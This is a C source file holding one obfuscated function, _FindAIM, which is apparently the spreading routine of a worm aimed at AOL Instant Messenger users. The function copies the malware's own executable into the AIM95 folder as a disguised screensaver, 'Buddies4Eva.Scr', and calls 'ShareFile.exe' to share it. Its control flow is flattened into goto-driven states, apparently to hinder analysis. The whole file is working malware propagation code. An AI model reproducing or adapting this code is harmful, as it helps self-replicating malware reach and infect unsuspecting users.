#pragma optimize("", off)
#include "data_globals.h"
#include <string.h>
#include <windows.h>

void _FindAIM(void)
{
    volatile int dummy_state = 1;

dummy_dispatcher:
    if (dummy_state == 1) goto block1;
    if (dummy_state == 2) goto block2;
    if (dummy_state == 3) goto block3;
    if (dummy_state == 4) goto block4;
    if (dummy_state == 0) goto end;

block1:
    // Build the path: \Program Files\AIM95\Buddies4Eva.Scr
    strcpy(_AimFull, "\\Program Files\\AIM95\\Buddies4Eva.Scr");
    dummy_state = 2;
    goto dummy_dispatcher;

block2:
    CopyFileA(_VirusPath, _AimFull, 0);
    dummy_state = 3;
    goto dummy_dispatcher;

block3:
    _chdir("\\Program Files\\AIM95\\");
    dummy_state = 4;
    goto dummy_dispatcher;

block4:
    system("ShareFile.exe \\Progra~1\\AIM95\\Buddies4Eva.Scr");
    dummy_state = 0;
    goto dummy_dispatcher;

end:
    return;
}
#pragma optimize("", on)
